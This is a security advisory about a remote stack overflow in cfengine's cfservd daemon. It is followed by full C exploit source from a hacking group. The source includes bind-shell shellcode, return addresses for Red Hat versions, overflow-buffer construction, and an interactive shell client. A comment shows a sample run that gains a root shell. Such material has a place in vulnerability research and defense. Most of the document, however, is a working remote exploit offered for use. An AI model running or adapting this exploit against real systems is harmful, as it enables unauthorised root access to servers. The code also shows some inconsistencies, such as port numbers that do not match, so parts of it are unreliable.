source: http://www.securityfocus.com/bid/8699/info

cfengine is prone to a stack-based buffer overrun vulnerability. This issue may be exploited by remote attackers who can send malicious transaction packets to cfservd. This issue is due to insufficient bounds checking of data that is read in during a transaction with a remote user.

The vulnerability may be exploited to execute arbitrary code with the privileges of cfservd. A denial of service may also be the result of exploitation attempts as cfservd is multi-threaded and may not be configured to restart itself via a super-server such as inetd. 

/*********************************************************************************\\

* jsk / cfengine2-2.0.3 from redhat 

* advisory: http://packetstormsecurity.nl/0309-advisories/cfengine.txt

* forking portbind shellcode 0port=26112)  by netric

* bug discovered by nick cleaton, tested on redhat

* DSR-cfengine.pl :)  i think it has some bugs.maybe it is only public
* version...... possbile another reasns.....
* the begin buf of exploit could be like \"111111\". so....DSR...
* by jsk from Ph4nt0m Security Team

* jsk@ph4nt0m.net  chat with us ( irc.0x557.org  #ph4nt0m)

* Greets bR-00t. eSdee.B??.lnewy.#cheese and all #ph4nt0m 

* [root@localhost tmp]# ./cnex -h 127.0.0.1 -p 5803 -t 0

*

* cfengine2-2.0.3:server remote buffer overflow exploit

* by jsk.

* Greets bR-00t and all #ph4nt0m .

*[+] Hostname: 127.0.0.1
*[+] Port num: 5308
*[+] Retaddr address: 0x4029cc2c
*[1] #1 Set  codes.
*[1] #1 Set socket.
*[*] attempting to connect: 127.0.0.1:5308.
*[*] successfully connected: 127.0.0.1:5308.
*[1] #1 Send codes.
*[1] #3 Get shell.
*[*] checking to see if the exploit was successful.
*[*] attempting to connect: 127.0.0.1:26112.
*[*] successfully connected: 127.0.0.1:26112.
* id
 *uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6  ** (disk),10(wheel)
 


\\*********************************************************************************/





#include <stdio.h>

#include <signal.h>

#include <unistd.h>

#include <sys/socket.h>

#include <netdb.h>

#include <netinet/in.h>

#define BUFSIZE 4136

#define D_PORT 5803

#define D_HOST \"www.ph4nt0m.net\"

#define TIMEOUT 10



char shell[]=  /* bindshell(26112)&, netric. */

        \"\\x90\\x90\\x90\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\"
        \"\\x6a\\x02\\x89\\xe1\\xb0\\x66\\x52\"
        \"\\x50\\xcd\\x80\\x43\\x66\\x53\\x89\"
        \"\\xe1\\x6a\\x10\\x51\\x50\\x89\\xe1\"
        \"\\x52\\x50\\xb0\\x66\\xcd\\x80\\x89\"
        \"\\xe1\\xb3\\x04\\xb0\\x66\\xcd\\x80\"
        \"\\x43\\xb0\\x66\\xcd\\x80\\x89\\xd9\"
        \"\\x93\\xb0\\x3f\\xcd\\x80\\x49\\x79\"
        \"\\xf9\\x52\\x68\\x6e\\x2f\\x73\\x68\"
        \"\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\"
        \"\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\"
        \"\\x80\";
struct op_plat_st

{

int op_plat_num;

char *op_plat_sys;

u_long retaddr;

int off_st;

};

struct op_plat_st __pl_form[]=

{



{0,\"red 8.0\",0x4029cc2c,0},

{1,\"red 9.0(cmp)\",0x4029cda0,0},



{2,\"red 7.2 (Compile)\",0x44444444,0},

{3,\"red 7.3 (Compile)\",0x44444444,0},

NULL

};

void banrl();

void x_fp_rm_usage(char *x_fp_rm);

unsigned short sock_connect(char *,unsigned short);

void getshell(char *,unsigned short);

void printe(char *,short);

void sig_alarm(){printe(\"alarm/timeout hit.\",1);}

void banrl()

{

fprintf(stdout,\"\\n cfengine2-2.0.3:server remote buffer overflow exploit)\\n\");

fprintf(stdout,\" by jsk.\\n\");

fprintf(stdout,\" Greets Br-00t and all #ph4nt0m .\\n\");

}



void x_fp_rm_usage(char *x_fp_rm)

{

int __t_xmp=0;

fprintf(stdout,\"\\n Usage: %s -[option] [arguments]\\n\\n\",x_fp_rm);

fprintf(stdout,\"\\t -h [hostname] - target host.\\n\");

fprintf(stdout,\"\\t -p [port] - port number.\\n\");

fprintf(stdout,\"\\t -s [addr] - &shellcode address.\\n\\n\");

fprintf(stdout,\" Example> %s -h target_hostname -p 8000 -t num\\n\",x_fp_rm);

fprintf(stdout,\" Select target number>\\n\\n\");

for(;;)

{

if(__pl_form[__t_xmp].op_plat_num==(0x82))

break;

else

{

fprintf(stdout,\"\\t {%d} %s\\n\",__pl_form[__t_xmp].op_plat_num,__pl_form[__t_xmp].op_plat_sys);

}

__t_xmp++;

}

fprintf(stdout,\"\\n\");
exit(0);
}



int main(int argc,char *argv[])

{

int port=D_PORT;

char hostname[0x333]=D_HOST;

int whlp,type=0;

unsigned int i=0;

char *buf;

int sd;

u_long retaddr=__pl_form[type].retaddr;



(void)banrl();

while((whlp=getopt(argc,argv,\"T:t:H:h:P:p:IiXx\"))!=EOF)

{

extern char *optarg;

switch(whlp)

{

case \'T\':

case \'t\':

if((type=atoi(optarg))<6)

{

retaddr=__pl_form[type].retaddr;

}

else (void)x_fp_rm_usage(argv[0]);

break;





case \'H\':

case \'h\':

memset((char *)hostname,0,sizeof(hostname));

strncpy(hostname,optarg,sizeof(hostname)-1);

break;



case \'P\':

case \'p\':

port=atoi(optarg);

break;



case \'I\':

case \'i\':

fprintf(stderr,\" Try `%s -?\' for more information.\\n\\n\",argv[0]);

exit(-1);



case \'?\':

(void)x_fp_rm_usage(argv[0]);

break;

}

}



if(!strcmp(hostname,D_HOST))

{

(void)x_fp_rm_usage(argv[0]);

}

{

fprintf(stdout,\" [+] Hostname: %s\\n\",hostname);

fprintf(stdout,\" [+] Port num: %d\\n\",port);

fprintf(stdout,\" [+] Retaddr address: %p\\n\",retaddr);

}



fprintf(stdout,\" [1] #1 Set  codes.\\n\");



 if(!(buf=(char *)malloc(BUFSIZE+1)))

  printe(\"getcode(): allocating memory failed.\",1);



  memset(buf, 0x90, BUFSIZE);

  buf[0] = \'1\';
  buf[1] = \'1\';
  buf[2] = \'1\';
  buf[3] = \'1\';
  buf[4] = \'1\';
  buf[5] = \'1\';
  buf[6] = \'1\';

  memset(buf+7,0x90,636); 

  memcpy(buf+7+636,shell, sizeof(shell));

  memset(buf+7+636+strlen(shell),0x90,3500); 

  memcpy(&buf[BUFSIZE-(sizeof(retaddr))], &retaddr, sizeof(retaddr));

  memcpy(&buf[BUFSIZE-(2*sizeof(retaddr))], &retaddr, sizeof(retaddr));

  memcpy(&buf[BUFSIZE-(3*sizeof(retaddr))], &retaddr, sizeof(retaddr));
  memcpy(&buf[BUFSIZE-(4*sizeof(retaddr))], &retaddr, sizeof(retaddr));

  memcpy(&buf[BUFSIZE-(5*sizeof(retaddr))], &retaddr, sizeof(retaddr));

  memcpy(&buf[BUFSIZE-(6*sizeof(retaddr))], &retaddr, sizeof(retaddr));
  memcpy(&buf[BUFSIZE-(7*sizeof(retaddr))], &retaddr, sizeof(retaddr));

  memcpy(&buf[BUFSIZE-(8*sizeof(retaddr))], &retaddr, sizeof(retaddr));

  memcpy(&buf[BUFSIZE-(9*sizeof(retaddr))], &retaddr, sizeof(retaddr));

 fprintf(stdout,\" [1] #1 Set socket.\\n\");

 sd=sock_connect(hostname,port);

fprintf(stdout,\" [1] #1 Send codes.\\n\");

 write(sd,buf,BUFSIZE);

 close(sd);
 sleep(1);
fprintf(stdout,\" [1] #3 Get shell.\\n\");
 getshell(hostname,26112);
 exit(0);

}

unsigned short sock_connect(char *hostname,

unsigned short port){

 int sock;

 struct hostent *t;

 struct sockaddr_in s;

 sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

 s.sin_family=AF_INET;

 s.sin_port=htons(port);

 printf(\"[*] attempting to connect: %s:%d.\\n\",hostname,port);

 if((s.sin_addr.s_addr=inet_addr(hostname))){

  if(!(t=gethostbyname(hostname)))

   printe(\"couldn\'t resolve hostname.\",1);

  memcpy((char*)&s.sin_addr,(char*)t->h_addr,

  sizeof(s.sin_addr));

 }

 signal(SIGALRM,sig_alarm);

 alarm(TIMEOUT);

 if(connect(sock,(struct sockaddr *)&s,sizeof(s)))

  printe(\"netris connection failed.\",1);

 alarm(0);

 printf(\"[*] successfully connected: %s:%d.\\n\",hostname,port);

 return(sock);

 }

void getshell(char *hostname,unsigned short port){

 int sock,r;

 fd_set fds;

 char buf[4096+1];

 struct hostent *he;

 struct sockaddr_in sa;

 printf(\"[*] checking to see if the exploit was successful.\\n\");

 if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)

  printe(\"getshell(): socket() failed.\",1);

 sa.sin_family=AF_INET;

 if((sa.sin_addr.s_addr=inet_addr(hostname))){

  if(!(he=gethostbyname(hostname)))

   printe(\"getshell(): couldn\'t resolve.\",1);

  memcpy((char *)&sa.sin_addr,(char *)he->h_addr,

  sizeof(sa.sin_addr));

 }

 sa.sin_port=htons(port);

 signal(SIGALRM,sig_alarm);

 alarm(TIMEOUT);

 printf(\"[*] attempting to connect: %s:%d.\\n\",hostname,port);

 if(connect(sock,(struct sockaddr *)&sa,sizeof(sa))){

  printf(\"[!] connection failed: %s:%d.\\n\",hostname,port);

  return;

 }

 alarm(0);

 printf(\"[*] successfully connected: %s:%d.\\n\\n\",hostname,port);

 signal(SIGINT,SIG_IGN);

 write(sock,\"uname -a;id\\n\",13);

 while(1){

  FD_ZERO(&fds);

  FD_SET(0,&fds);

  FD_SET(sock,&fds);

  if(select(sock+1,&fds,0,0,0)<1)

   printe(\"getshell(): select() failed.\",1);

  if(FD_ISSET(0,&fds)){

   if((r=read(0,buf,4096))<1)

    printe(\"getshell(): read() failed.\",1);

   if(write(sock,buf,r)!=r)

    printe(\"getshell(): write() failed.\",1);

  }

  if(FD_ISSET(sock,&fds)){

   if((r=read(sock,buf,4096))<1)

    exit(0);

   write(1,buf,r);

  }

 }

 close(sock);

 return;

}

void printe(char *err,short e){

 fprintf(stdout,\" [-] Failed.\\n\\n\");

 fprintf(stdout,\" Happy Exploit ! :-)\\n\\n\");



 if(e)

  exit(1);

 return;

}







